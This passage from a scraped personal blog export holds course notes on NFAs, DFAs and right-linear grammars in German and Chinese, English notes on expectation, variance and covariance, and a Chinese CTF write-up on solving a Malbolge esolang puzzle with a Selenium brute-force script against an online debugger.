automaton, NFA) ist ein 5-Tupel$N = (Q, \\Sigma, \\delta, q_0, F)$, so dass$Q$, $\\Sigma$, $q_0$ und $F$ sind wie bei einem DFA $\\delta : Q \\times \\Sigma \\rightarrow \\mathcal{P}(Q)$ $\\mathcal{P}(Q)$ = Menge aller Teilmengen von $Q$ Alternative: Relation $\\delta \\subseteq Q \\times \\Sigma \\times Q$ 注意，在DFA里，每一个状态（Zustand）以及一个Übergang只对应一个状态（Zustand）。而在NFA里，一个状态（Zustand）以及一个Übergang可以对应多个状态。 例子： 每一个点可能会拥有多条相同名字的边，所以结果是不确定的。（nichtdeterministisch ） 当我们输入$0111$，可能会得到多个Zustandsfolgen： p,p,p,p,p, \\ \\ \\ p,p,p,p,q \\ \\ \\ p,p,p,q,r和之前类似，我们可以在$\\delta$的基础上定义 \\begin{align*} \\bar{\\delta}: \\mathcal{P}(Q) \\times \\Sigma &\\to \\mathcal{P}(Q) \\\\ \\bar{\\delta}(S,a) :&= \\bigcup_{q \\in S} \\delta(q, a) \\end{align*}并在这个基础上像之前一样inductive定义 \\hat{\\bar{\\delta}} : \\mathcal{P}(Q) \\times \\Sigma^* \\rightarrow \\mathcal{P}(Q)而$\\hat{\\delta}(S, w)$ 可以理解成是Menge aller Zustände, die sich von einem Zustand in $S$ aus mit $w$ erreichen lassen. 例子： \\begin{aligned} \\hat{\\bar{\\delta}}(\\{p,q\\},10) &= \\hat{\\bar{\\delta}}(\\bar{\\delta}(\\{p, q\\}, 1), 0) \\\\ &= \\hat{\\bar{\\delta}}(\\delta(p, 1) \\cup \\delta(q, 1), 0) \\\\ &= \\hat{\\bar{\\delta}}(\\{p, q, r\\}, 0) \\\\ &= \\bar{\\delta}(\\{p, q, r\\}, 0) \\\\ &= \\delta(p, 0) \\cup \\delta(q, 0) \\cup \\delta(r, 0) \\\\ &= \\{p\\} \\cup \\{r\\} \\cup \\emptyset \\\\ &= \\{p, r\\} \\end{aligned}也就是说从$p,q$出发，进行一遍$10$的操作，最后一定会落在$p,r$。 Definition:Die von $N = (Q, \\Sigma, \\delta, q_0, F)$ akzeptierte Sprache ist:L(N) := \\{ w \\in \\Sigma^* \\mid \\hat{\\delta}(\\{q_0\\}, w) \\cap F \\neq \\emptyset \\} 注意，在DFA定义的akzeptierte Sprache里，是 L(M) := \\{ w \\in \\Sigma^* \\mid \\hat{\\delta}(q_0, w) \\in F \\},而在这里，由于$\\hat{\\delta}(q_0, w)$ 是几个集合，所以我们要求的是它和$F$的交集不为空，也就是说只要存在到达的可能性那就会被akzeptiert。 为了方便，我们后续一般还是用$\\delta$ 指代$\\bar{\\delta}$ ， $\\hat{\\delta}$ 指代$\\hat{\\bar{\\delta}}$ 。 Theorem:Für jede rechtslineare Grammatik $G$ gibt es einen NFA $N$ mit L(G) = L(N) 主要的构造（证明）思路就是将Grammatik里的Variablen （V）构造成NFA的Zustände（Q），然后将Grammatik的Produktion构造成NFA里的Übergänge。 我们来看一下针对下面这个比较allgemein的例子的具体构造。 例子： \\begin{aligned} S &\\rightarrow aX \\mid aY \\\\ X &\\rightarrow aX \\mid bY \\mid a \\\\ Y &\\rightarrow aS \\mid bX \\mid aY \\mid b \\end{aligned}证明（构造）： Sei $G = (V, \\Sigma, P, S)$ eine rechtslineare Grammatik ohne die Produktion $S \\rightarrow \\varepsilon$.Definiere den NFA $A = (Q, \\Sigma, \\delta, q_0, F)$ mit: $Q = V \\cup \\{q_f\\}$ (wobei $q_f \\notin V$) $Y \\in \\delta(X, a)$ gdw $(X \\rightarrow aY) \\in P$ $q_f \\in \\delta(X, a)$ gdw $(X \\rightarrow a) \\in P$ $q_0 = S$ $F = \\{q_f\\}$ Es gilt: $a_1 \\ldots a_n \\in L(G)$ – gdw es existieren Variablen $X_1, \\ldots, X_{n-1}$ S \\rightarrow a_1X_1 \\rightarrow_G a_1a_2X_2 \\rightarrow_G \\cdots \\rightarrow_G a_1 \\ldots a_{n-1}X_{n-1} \\rightarrow_G a_1 \\ldots a_n– gdw es existieren Zustände $X_1, \\ldots, X_{n-1}$ \\delta(S, a_1) \\ni X_1,\\quad \\delta(X_1, a_2) \\ni X_2,\\quad \\ldots,\\quad \\delta(X_{n-1}, a_n) \\ni q_F– gdw $a_1 \\ldots a_n \\in L(A)$ . $\\square$ 假设这个Grammatik还包含了$S \\to \\varepsilon$，那么需要将$F$构造成$F= \\{S, q_f\\}$。 Theorem:Für jeden NFA $N$ gibt es einen DFA $M$ mit L(N) = L(M) 证明： Sei $N = (Q, \\Sigma, \\delta, q_0, F)$ ein NFA.Definiere den DFA $M = (\\mathcal{P}(Q), \\Sigma, \\bar{\\delta}, \\{q_0\\}, F_M)$: F_M := \\{ S \\subseteq Q \\mid S \\cap F \\neq \\emptyset \\}Dann gilt: \\begin{aligned} w \\in L(N) &\\Leftrightarrow \\hat{\\bar{\\delta}}(\\{q_0\\}, w) \\cap F \\neq \\emptyset &\\text{Def.} \\\\ &\\Leftrightarrow \\hat{\\bar{\\delta}}(\\{q_0\\}, w) \\in F_M &\\text{Def.} \\\\ &\\Leftrightarrow w \\in L(M) &\\text{Def.} \\end{aligned}. $\\square$ 这种构造叫做 Potenzmengenkonstruktion 或者 Teilmengenkonstruktion。 注意，按照这个构造，如果NFA里有n个Zustände， 那对应的DFA里会有$2^n$个Zustände。很多当然是可以避免这个规格的，但是有些时候并避免不了。在这个Corollary之后我们会看一个避免不了的例子。 Corollary:Für jede rechtslineare Grammatik $G$ gibt es einen DFA $M$ mit L(G) = L(M) 例子： L_k := \\{ w \\in \\{0,1\\}^* \\mid \\text{das $k$-letzte Bit von } w \\text{ ist } 1 \\}（注意，这里是倒数第$k$位为1，不是正数。） Ein NFA für diese Sprache: Lemma:Jeder DFA $M$ mit $L(M) = L_k$ hat mindestens $2^k$ Zuständen. 证明： 我们需要做的是证明 für alle $w_1, w_2 \\in \\{0, 1\\}^k$: w_1 \\ne w_2 \\Rightarrow \\hat{\\delta}(q_0, w_1) \\ne \\hat{\\delta}(q_0, w_2)证明了这个之后，由于$\\{0, 1\\}^k$里有$2^k$个元素，那么任意一个DFA里也至少会有$2^k$个Zusände，因为对于所有的$w \\in \\{0, 1\\}^k$，$\\hat{\\delta}(q_0, w)$都是$M$里的一个Zustand。 那么我们现在开始证明这个结论，用反证法： Annahme: Es gibt $w_1, w_2 \\in \\{0, 1\\}^k$ mit $w_1 \\ne w_2$, aber $\\hat{\\delta}(q_0, w_1) = \\hat{\\delta}(q_0, w_2)$. Sei $w_1 = wa_i \\ldots a_k$ und $w_2 = wb_i \\ldots b_k$ mit $a_i \\ne b_i$ （$i$表示的是$w_1,w_2$第一个不相等的位。而前面相同的部分我们就简单记作$w$。）o.E. sei $a_i = 1$, $b_i = 0$. Es gilt einerseits: \\begin{aligned} w_1 0^{i-1} &= wa_i \\ldots a_k 0^{i-1} \\in L_k \\\\ w_2 0^{i-1} &= wb_i \\ldots b_k 0^{i-1} \\notin L_k \\end{aligned}（在$w_1,w_2$后面加上$i-1$个0，这样一来第一个的倒数第$k$位就是1，第二个的倒数第$k$位是0。） Aber es gilt auch: \\begin{aligned} \\hat{\\delta}(q_0, w_1 0^{i-1}) &= \\hat{\\delta}(\\hat{\\delta}(q_0, w_1), 0^{i-1}) \\\\ &= \\hat{\\delta}(\\hat{\\delta}(q_0, w_2), 0^{i-1}) \\quad \\text{nach der Annahme}\\\\ &= \\hat{\\delta}(q_0, w_2 0^{i-1}) \\end{aligned}但是根据$L(M)$的定义： L(M) := \\{ w \\in \\Sigma^* \\mid \\hat{\\delta}(q_0, w) \\in F \\},不可能存在$a,b$满足$\\hat{\\delta}(q_0, a) = \\hat{\\delta}(q_0, b)$，但是一个在$L(M)$，一个不在。 所以说得到一个Wiederspruch. $\\square$ Theorem:Für jeden DFA $M$ gibt es eine rechtslineare Grammatik $G$ mit L(M) = L(G) 证明： Sei $M = (Q, \\Sigma, \\delta, q_0, F)$.Die Grammatik $G = (V, T, P, S)$ mit: $V = Q$, $T = \\Sigma$, $S = q_0$ $(q_1 \\rightarrow aq_2) \\in P$ gdw $\\delta(q_1, a) = q_2$ $(q_1 \\rightarrow a) \\in P$ gdw $\\delta(q_1, a) \\in F$ $(q_0 \\rightarrow \\varepsilon) \\in P$ gdw $q_0 \\in F$ ist von Typ 3 und erfüllt $L(M) = L(G)$.$\\square$ NFAs mit $\\epsilon$-ÜbergängenDefinition:Ein NFA mit $\\epsilon$-Übergängen (auch $\\varepsilon$-NFA) ist ein NFA mit einem speziellen Symbol $\\epsilon \\notin \\Sigma$ und mit\\delta : Q \\times (\\Sigma \\cup \\{\\epsilon\\}) \\rightarrow \\mathcal{P}(Q).Ein $\\epsilon$-Übergang darf ausgeführt werden, ohne dass ein Eingabezeichen gelesen wird. 注意，这里的$\\epsilon$和之前用的$\\varepsilon$是不一样的东西。 $\\epsilon$ ist ein einzelnes Symbol, $\\varepsilon$ ist das leere Wort. 例子： 这个$\\varepsilon$-NFA可以接受$\\varepsilon,00,11,…$，但不能接受$101,…$。 也就是说，这个Automat虽然读取的是$11$，但它可以先（“免费”）跳到$q_1$，然后再进行2次$1$的操作。 Lemma:Für jeden $\\epsilon$-NFA $N$ gibt es einen NFA $N’$ mit L(N) = L(N'). 证明： Sei $N = (Q, \\Sigma, \\delta, q_0, F)$ ein $\\epsilon$-NFA.Wir definieren den NFA$N’ = (Q, \\Sigma, \\delta’, q_0, F’)$ mit folgenden Definitionen für $\\delta’$ und $F’$: $\\delta’ : Q \\times \\Sigma \\rightarrow \\mathcal{P}(Q)$ \\delta'(q, a) := \\bigcup_{i \\geq 0, j \\geq 0} \\hat{\\delta}(\\{q\\}, \\epsilon^i a \\epsilon^j) Falls $N$ das leere Wort $\\varepsilon$ akzeptiert, also falls \\exists i \\geq 0 : \\hat{\\delta}(\\{q_0\\}, \\epsilon^i) \\cap F \\neq \\emptysetdann setze $F’ := F \\cup \\{q_0\\}$, sonst setze $F’ := F$.$\\square$ 例子： Reguläre Ausdrücke 正则表达式","categories":[{"name":"TUM info 课程笔记","slug":"TUM-info-课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"Theoretische Informatik 理论信息学","slug":"TUM-info-课程笔记/Theoretische-Informatik-理论信息学","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Theoretische-Informatik-%E7%90%86%E8%AE%BA%E4%BF%A1%E6%81%AF%E5%AD%A6/"}],"tags":[{"name":"Theoretische Informatik","slug":"Theoretische-Informatik","permalink":"https://archer-baiyi.github.io/tags/Theoretische-Informatik/"},{"name":"理论信息学","slug":"理论信息学","permalink":"https://archer-baiyi.github.io/tags/%E7%90%86%E8%AE%BA%E4%BF%A1%E6%81%AF%E5%AD%A6/"}]},{"title":"概率论 Probability Theory","slug":"TUM  数学 笔记/概率论/概率论-Probability-Theory","date":"2025-04-26T18:32:06.000Z","updated":"2025-05-08T09:13:49.831Z","comments":true,"path":"2025/04/26/TUM  数学 笔记/概率论/概率论-Probability-Theory/","permalink":"https://archer-baiyi.github.io/2025/04/26/TUM%20%20%E6%95%B0%E5%AD%A6%20%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E6%A6%82%E7%8E%87%E8%AE%BA-Probability-Theory/","excerpt":"概率论相关笔记","text":"BasicsExpected value / Expectation / Erwartungswert / 期望Definition : Let $X$ be a random variable on a probability space $(\\Omega,\\mathcal{F},P)$. The expectation of $X$ is defined by\\mathbb{E}[X] = \\int_{\\Omega}X(\\omega)P(d\\omega). Theorem: Let $X:\\Omega \\to S$ be a random variable on a probability space $(\\Omega,\\mathcal{F},P)$ with distribution $\\mu$ and let $g:S\\to \\mathbb{R}$ be a measurable function. Then\\mathbb{E}[g(X)] = \\int_{S}g(x)\\mu(dx). Corollary: If $X$ is a discrete random variable with values in $S$, then \\mathbb{E}[g(X)] = \\sum_{x \\in S}g(x)P(X=x). Corollary: If $X$ is a discrete random variable with values in $S \\subseteq \\mathbb{R}$, then \\mathbb{E}[X] = \\sum_{x \\in S}xP(X=x).Proof: Choose $g = id_S: S \\to S \\subseteq \\mathbb{R}$.$\\square$ Corollary: If $X : \\Omega \\to \\mathbb{R}^n$ has the probability density function (Verteilungsdichte) $f$, then for every Borel-measurable function $g : \\mathbb{R}^n \\to \\mathbb{R}$, the following holds: \\mathbb{E}[g(X)] = \\int_{\\mathbb{R}^n} g(x) f(x) \\, dx. Corollary: If $X$ has values in $\\mathbb{R}$ \\mathbb{E}[X] = \\int_{\\mathbb{R}} x f(x) \\, dx. Theorem (Linearity): Let $X,Y :\\Omega \\to \\mathbb{R}$ be random variables in $\\mathcal{L}^1$. Then\\mathbb{E}[aX+bY] = a\\mathbb{E}[X] + b\\mathbb{E}[Y] \\ \\ \\text{ for all }a,b \\in \\mathbb{R} Theorem: Let$X,Y :\\Omega \\to \\mathbb{R}$be independent random variables, $g,h: \\mathbb{R} \\to \\mathbb{R}$ be Borel-measurable function with $E[|g(X)|], E[|h(Y)|] &lt; \\infty$. Then\\mathbb{E}[g(X)h(Y)] = \\mathbb{E}[g(X)] \\mathbb{E}[h(Y)]. proof: Since $X$ and $Y$ are independent, the joint distribution of $(X, Y)$ is the product of the marginal distributions $P_X \\times P_Y$. Using Fubini’s theorem, we obtain \\begin{align*} \\mathbb{E}[g(X)h(Y)] &= \\int_{\\mathbb{R}} \\int_{\\mathbb{R}} g(x)h(y) \\, P_X(dx) P_Y(dy)\\\\ &= \\left( \\int_{\\mathbb{R}} g(x) \\, P_X(dx) \\right) \\left( \\int_{\\mathbb{R}} h(y) \\, P_Y(dy) \\right) = \\mathbb{E}[g(X)] \\mathbb{E}[h(Y)]. \\end{align*}$\\square$ Corollary: Let$X,Y :\\Omega \\to \\mathbb{R}$be independent random variables in $\\mathcal{L}^1$, then \\mathbb{E}[XY] = \\mathbb{E}[X] \\mathbb{E}[Y].MomentDefinition : $E[X^n]$is called the $n^{\\text{th}}$ moment of X. Theorem:Let $X \\sim \\mathcal{N}(\\mu,\\sigma^2)$ be a random variable. Then for any non-negative integer $p$ we have:\\mathbb{E}[(X - \\mu)^p] =\\begin{cases}0 & \\text{if } p \\text{ is odd}, \\\\\\sigma^p (p - 1)!! & \\text{if } p \\text{ is even}.\\end{cases}Here, $n!!$ denotes the double factorial, that is, the product of all numbers from $n$ to 1 that have the same parity as $n$. Corollary:Let $X \\sim \\mathcal{N}(0,\\sigma^2)$ be a random variable. Then for any non-negative integer $p$ we have:\\mathbb{E}[X^p] =\\begin{cases}0 & \\text{if } p \\text{ is odd}, \\\\\\sigma^p (p - 1)!! & \\text{if } p \\text{ is even}.\\end{cases} Example: Let $X \\sim \\mathcal{N}(0,\\sigma^2)$ be a random variable, we have: $\\mathbb{E}[X^2] = \\sigma^2$ $\\mathbb{E}[X^3] = 0$ $\\mathbb{E}[X^4] = 3 \\sigma^4$ Variance / Varianz / 方差Definition: Let$X\\in \\mathcal{L}^1$. Then \\text{Var} = \\mathbb{E}[(X-\\mathbb{E}(X))^2]is called the variance of$X$and \\sigma_X = \\sqrt{Var(X)}is the standard deviation of $X$. Theorem: Let$X\\in \\mathcal{L}^1$, then\\text{Var} = \\mathbb{E}[X^2] - \\mathbb{E}[X]^2. proof: let $\\mu:=E[X]$. \\begin{align*} \\text{Var} &= \\mathbb{E}[(X-\\mu)^2]\\\\ &= \\mathbb{E}[X^2-2\\mu X + \\mu^2]\\\\ &= \\mathbb{E}[X^2]-2\\mu E[X] + \\mu^2\\\\ &= \\mathbb{E}[X^2]- \\mu^2 \\end{align*}$\\square$ Theorem: Let $X$ be a random variable with finite expectation. For $a,b \\in \\mathbb{R}$, it holds that:\\text{Var}(aX + b) = a^2 \\text{Var}(X) proof: \\begin{align*} \\text{Var}(aX + b) &= \\mathbb{E}\\left[(aX + b - \\mathbb{E}[aX+b])^2\\right] \\\\ &= \\mathbb{E}\\left[(aX + b - (a\\mathbb{E}[X] + b))^2\\right] \\quad \\text{(by linearity)}\\\\ &= \\mathbb{E}\\left[a^2 (X - \\mathbb{E}[X])^2\\right] \\\\ &= a^2 \\text{Var}(X) \\end{align*}$\\square$ Theorem:Let $X,Y$ be independent random variables, then Var(XY) = Var(X)Var(Y) + Var(X)\\mathbb{E}[Y]^2 + Var(Y)\\mathbb{E}[X]^2 Proof: \\begin{align*} Var(XY) &= \\mathbb{E}[X^2Y^2] - \\mathbb{E}[XY]^2\\\\ &=\\mathbb{E}[X^2]\\mathbb{E}[Y^2] - \\mathbb{E}[X]^2\\mathbb{E}[Y]^2\\\\ &= (Var(X) + \\mathbb{E}[X]^2)(Var(Y) + \\mathbb{E}[Y]^2) - \\mathbb{E}[X]^2\\mathbb{E}[Y]^2\\\\ &= Var(X)Var(Y) + Var(X)\\mathbb{E}[Y]^2 + Var(Y)\\mathbb{E}[X]^2 \\end{align*}. $\\square$ Covariance / 协方差Definition :For real-valued random variables$X, Y \\in L^2$, the covariance of$X$and$Y$is defined by\\text{Cov}(X, Y) = \\mathbb{E}\\Bigl[(X - \\mathbb{E}[X])(Y - \\mathbb{E}[Y])\\Bigl] Theorem:(a) $\\text{Cov}(X, X) = \\text{Var}(X)$(b) $\\text{Cov}(X, Y) = \\mathbb{E}[XY] - \\mathbb{E}[X]\\mathbb{E}[Y]$(c) If $X$ and $Y$ are independent, then $\\operatorname{Cov}(X, Y) = 0$. Proof: (a) Clear from the definition. (b) By the linearity of expectation, it follows: \\text{Cov}(X, Y) = \\mathbb{E}[XY - X\\mathbb{E}[Y] - \\mathbb{E}[X]Y + \\mathbb{E}[X]\\mathbb{E}[Y]] = \\mathbb{E}[XY] - \\mathbb{E}[X]\\mathbb{E}[Y].(c) The claim follows from $\\mathbb{E}[XY] = \\mathbb{E}[X]\\mathbb{E}[Y]$.$\\square$ Theorem: Let $X_i, Y_j \\in L^2$, $a_i, b_j \\in \\mathbb{R}$, $1 \\leq i \\leq n$, $1 \\leq j \\leq m$. Then:(a) The covariance is bilinear:\\operatorname{Cov}\\left( \\sum_{i=1}^{n} a_i X_i, \\sum_{j=1}^{m} b_j Y_j \\right) = \\sum_{i=1}^{n} \\sum_{j=1}^{m} a_i b_j \\operatorname{Cov}(X_i, Y_j)(b)\\operatorname{Var}\\left( \\sum_{i=1}^{n} X_i \\right) = \\sum_{i=1}^{n} \\operatorname{Var}(X_i) + \\sum_{\\substack{i,j=1\\\\i \\neq j}}^{n} \\operatorname{Cov}(X_i, X_j)In particular:\\operatorname{Var}(X_1 + X_2) = \\operatorname{Var}(X_1) + \\operatorname{Var}(X_2) + 2 \\operatorname{Cov}(X_1, X_2)(c) If $X_1, \\dots, X_n$ are uncorrelated, i.e., $\\operatorname{Cov}(X_i, X_j) = 0$ for all $i \\neq j$, then:\\operatorname{Var}\\left( \\sum_{i=1}^{n} X_i \\right) = \\sum_{i=1}^{n} \\operatorname{Var}(X_i)This holds especially if $X_1, \\dots, X_n$ are independent. Proof: (a) Since $\\operatorname{Cov}(X, Y) = \\operatorname{Cov}(Y, X)$, it suffices to show linearity in the first argument. From the linearity of expectation, it follows: \\begin{align*} \\operatorname{Cov}\\left( \\sum_{i=1}^{n} a_i X_i, Y \\right) &= \\mathbb{E}\\left[ \\left( \\sum_{i=1}^{n} a_i X_i - \\mathbb{E}\\left[ \\sum_{i=1}^{n} a_i X_i \\right] \\right)(Y - \\mathbb{E}[Y]) \\right] \\\\ &= \\mathbb{E}\\left[ \\sum_{i=1}^{n} a_i (X_i - \\mathbb{E}[X_i])(Y - \\mathbb{E}[Y]) \\right] = \\sum_{i=1}^{n} a_i \\operatorname{Cov}(X_i, Y) \\end{align*}(b) Using part (a), we get: \\begin{align*} \\operatorname{Var}\\left( \\sum_{i=1}^{n} X_i \\right) &= \\operatorname{Cov}\\left( \\sum_{i=1}^{n} X_i, \\sum_{j=1}^{n} X_j \\right) = \\sum_{i=1}^{n} \\sum_{j=1}^{n} \\operatorname{Cov}(X_i, X_j) \\\\ &= \\sum_{i=1}^{n} \\operatorname{Var}(X_i) + \\sum_{\\substack{i,j=1\\\\i \\neq j}}^{n} \\operatorname{Cov}(X_i, X_j) \\end{align*}In the special case $n = 2$, this gives: \\operatorname{Var}(X_1 + X_2) = \\operatorname{Var}(X_1) + \\operatorname{Var}(X_2) + \\operatorname{Cov}(X_1, X_2) + \\operatorname{Cov}(X_2, X_1)(c) Follows from part (b).$\\square$","categories":[{"name":"TUM 数学 笔记","slug":"TUM-数学-笔记","permalink":"https://archer-baiyi.github.io/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/"},{"name":"概率论 Probability Theory","slug":"TUM-数学-笔记/概率论-Probability-Theory","permalink":"https://archer-baiyi.github.io/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA-Probability-Theory/"}],"tags":[{"name":"概率论","slug":"概率论","permalink":"https://archer-baiyi.github.io/tags/%E6%A6%82%E7%8E%87%E8%AE%BA/"},{"name":"Probability Theory","slug":"Probability-Theory","permalink":"https://archer-baiyi.github.io/tags/Probability-Theory/"}]},{"title":"奇奇怪怪的编程语言：Malbolge","slug":"CTF/Misc/奇奇怪怪的编程语言：Malbolge","date":"2025-04-25T20:30:56.000Z","updated":"2025-04-25T20:42:18.467Z","comments":true,"path":"2025/04/25/CTF/Misc/奇奇怪怪的编程语言：Malbolge/","permalink":"https://archer-baiyi.github.io/2025/04/25/CTF/Misc/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%EF%BC%9AMalbolge/","excerpt":"简单介绍 Malbolge","text":"除了我们日常使用的Python、Java、C等主流编程语言外，还存在这么一类极为晦涩难懂的编程语言，被称为深奥的编程语言（Esoteric programming language，简称Esolang）。它们被设计用于测试计算机语言表达的极限，所以不会考虑它们的实用性。今天我们来看其中一个非常典型的例子：Malbolge。 Malbolge由Ben Olmstead 在1998年发明,其名字来自于但丁的《神曲》中的第八层地狱“Malebolge”，意大利语中意为“邪恶的沟渠”（male bolge）。 Hello World下面这段Malbolge代码会输出“Hello, World.”1(=&lt;`#9]~6ZY327Uv4-QsqpMn&amp;+Ij&quot;&#x27;E%e&#123;Ab~w=_:]Kw%o44Uqp0/Q?xNvL:`H%c#DD2^WV&gt;gY;dts76qKJImZkj而这段代码则会输出“Hello, World!”1(&#x27;&amp;%:9]!~&#125;|z2Vxwv-,POqponl$Hjihf|B@@&gt;,=&lt;M:9&amp;7Y#VV2TSn.Oe*c;(I&amp;%$#&quot;mCBA?zxxv*Pb8`qo42mZF.&#123;Iy*@dD&#x27;&lt;;_?!\\&#125;&#125;|z2VxSSQ我们可以看到，光是一个标点符号的改变，就导致代码发生了天翻地覆的变化。 CTF大多数涉及 Malbolge 的基础 CTF 题目会提供一段看似乱码的内容。此时，需要识别出这实际上是 Malbolge 代码，并通过编译器将其编译出来。 比如说这段代码会输出“flag{this_is_a_flag}”1D&#x27;`;qLo=I;|XyhCwStcr=NL-,I$)&quot;XW21A/c&gt;,v_)\\xqYonsrqj0hPlkdcb(`Hd]#a`_A@VzZY;QuUTSRQJImGLEJIBAeED&amp;B;_9&gt;7&lt;;:921U54ts10)M&#x27;&amp;Jkj&quot;F&amp;%|#z@~&#125;vu;y[Zvo5Vlkjongf,Miha&#x27;Hd]\\[ZY&#125;W?UZYRQuU7SLp] 有些题目可能需要对编译后的结果再进行一次处理，比如使用 base64 解码等。但是这些内容都不需要了解任何 Malbolge 语言的特性，只需要找到一个编译器即可。因此，接下来我会介绍一些 Malbolge 的特点，并分享一道较难的 CTF 比赛真题。 Malbolge的特点首先，Malbolge会使用 三个寄存器（register），分别是 a、c 和 d。a：Accumulator，主要用于存储计算结果和输入/输出数据。c：Code Pointer / Instruction Pointer，用于指向当前正在执行的代码的位置（即指令指针）。d：Data Pointer，用于指向内存中的数据位置。 其次，基于这些寄存器，Malbolge提供了八条指令，分别为：jmp，out，in，rotr，mov，crz，nop，end。我们可以利用某些在线编译网站提供的规范化（Normalization）功能，将代码转换为由一组固定字符组成的指令字符集，从而更方便地进行调试（debug）。 更多详细信息可以参考https://en.wikipedia.org/wiki/Malbolge 例题题目来源：Platypwn 2024 CTF链接：https://platypwn.ctf.platypwnies.de/题面： 下载下来的文件内容为：1D&#x27;`__LK!mY:jiy6Be3cPa)onKI[#j4&amp;DUBzcx&gt;_;):&#x27;Zputml21onPlkd*hJIedcb[!YXW&#123;[TYXWVUNrRQPImGFEDIBfFED=&lt;;:?8\\&lt;;432V65ut,P*/(&#x27;&amp;J*j(!~&#125;C#cy~&#125;v&lt;tsxwvon4Ukji/Plejc)gIedcb[!_^]\\U=SwWVONMqQPONMFjJIHGF(&gt;b&lt;$:?876ZG这段内容看似是乱码，但根据题面的提示“the worst of esoteric programming languages” （正如前文所提到的），我们可以判断出它实际上是一段Malbolge的代码。直接编译这段代码无法得到任何结果，因此我们可以选择使用某个在线编译工具对其进行规范化处理，使代码转换为更标准的指令字符集，从而便于调试（debug）： normalized 之后的结果为： 1ojii&lt;vvj/io//jov/o/&lt;/p**&lt;i/pjvo&lt;/&lt;pjp&lt;*iv&lt;v*poopp&lt;&lt;oo*oop&lt;o**oooop&lt;ppp&lt;opooooop&lt;ooop&lt;ppppop&lt;oooppppop&lt;ooppp&lt;oo**p&lt;poppp&lt;o*oppp&lt;o*poop&lt;ppooopp&lt;*ppp&lt;*opop&lt;o*oooop&lt;oooop*p&lt;ooppp&lt;ooooop&lt;ooooo*p&lt;p*poppp&lt;v 当我们运行这段代码时，会发现它在执行到中间某处时意外停止了： 大概是在这个位置： 所以我们猜测（尝试）需要将这一项改成其他的命令。而在将其改正为p了之后会得到： 订正后的内容 1ojii&lt;vvj/io//jov/o/&lt;/p**&lt;i/pjvo&lt;/&lt;pjp&lt;*iv&lt;p*poopp&lt;&lt;oo*oop&lt;o**oooop&lt;ppp&lt;opooooop&lt;ooop&lt;ppppop&lt;oooppppop&lt;ooppp&lt;oo**p&lt;poppp&lt;o*oppp&lt;o*poop&lt;ppooopp&lt;*ppp&lt;*opop&lt;o*oooop&lt;oooop*p&lt;ooppp&lt;ooooop&lt;ooooo*p&lt;p*poppp&lt;v 1D&#x27;`__LK!mY:jiy6Be3cPa)onKI[#j4&amp;DUBzcx&gt;_;):&#x27;Zputml21onPlkd*hJIedcb[!YXW&#123;[TYXWVUNrRQPImGFEDIBfFED=&lt;;:?8\\&lt;;432V65ut,P*/(&#x27;&amp;J*j(!~&#125;C#cy~&#125;v&lt;tsxwvon4Ukji/Plejc)gIedcb[!_^]\\U=SwWVONMqQPONMFjJIHGF(&gt;b&lt;$:?876ZG 具体改动： 这样一来我们就成功获取到了flag。 其他办法暴力破解当然，如果我们知道（或猜测）这段代码中只有一个地方存在问题，可以尝试使用暴力破解（brute force）的方法进行修正。这种方法的核心是将每条指令逐一修改为其他可能的指令，并观察编译结果。由于不需要理解 Malbolge 的具体特性，因此这种方法非常简单。 为实现这一目标，我们可以利用支持在线编译 Malbolge 的网站，以及 Python 中的 Selenium 库。Selenium 提供了浏览器自动化操作功能，能够帮助我们完成网页上的勾选、输入操作，并提取输出内容，从而实现自动化调试。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980from selenium import webdriverfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.support.ui import WebDriverWaitfrom selenium.webdriver.support import expected_conditions as ECimport time# 初始化浏览器（确保你有对应的浏览器驱动）# driver = webdriver.Chrome() # Chromedriver = webdriver.Firefox() # Firefoxtry: # 打开目标网页 driver.get(&quot;https://lutter.cc/malbolge/debugger.html&quot;) # 等待页面加载 wait = WebDriverWait(driver, 30) # 勾选所有复选框 checkboxes_ids = [&#x27;until_in&#x27;, &#x27;until_out&#x27;, &#x27;until_crz&#x27;, &#x27;until_rotr&#x27;, &#x27;until_jmp&#x27;, &#x27;until_mov&#x27;, &#x27;until_nop&#x27;] for checkbox_id in checkboxes_ids: checkbox = wait.until(EC.element_to_be_clickable((By.ID, checkbox_id))) if not checkbox.is_selected(): checkbox.click() # 勾选Normalized normalized_checkbox = wait.until(EC.element_to_be_clickable((By.ID, &#x27;normalizedcode&#x27;))) if not normalized_checkbox.is_selected(): normalized_checkbox.click() # 原始Malbolge代码 original_code = &quot;ojii&lt;vvj/io//jov/o/&lt;/p**&lt;i/pjvo&lt;/&lt;pjp&lt;*iv&lt;v*poopp&lt;&lt;oo*oop&lt;o**oooop&lt;ppp&lt;opooooop&lt;ooop&lt;ppppop&lt;oooppppop&lt;ooppp&lt;oo**p&lt;poppp&lt;o*oppp&lt;o*poop&lt;ppooopp&lt;*ppp&lt;*opop&lt;o*oooop&lt;oooop*p&lt;ooppp&lt;ooooop&lt;ooooo*p&lt;p*poppp&lt;v&quot; # 替换的字符列表 replace_chars = [&#x27;i&#x27;, &#x27;j&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;/&#x27;, &#x27;*&#x27;] # 标志变量，用于退出循环 found_flag = False # 循环替换并执行代码 for i in range(1, len(original_code)): if found_flag: # 如果找到结果，退出外层循环 break for char in replace_chars: modified_code = list(original_code) modified_code[i] = char # 替换第i个字符 modified_code = &#x27;&#x27;.join(modified_code) # 输入修改后的Malbolge代码 program_textarea = driver.find_element(By.ID, &quot;program&quot;) program_textarea.clear() program_textarea.send_keys(modified_code) # 点击Load/Reset按钮 load_button = driver.find_element(By.ID, &quot;load&quot;) load_button.click() # 点击Execute按钮 execute_button = wait.until(EC.element_to_be_clickable((By.ID, &quot;run&quot;))) 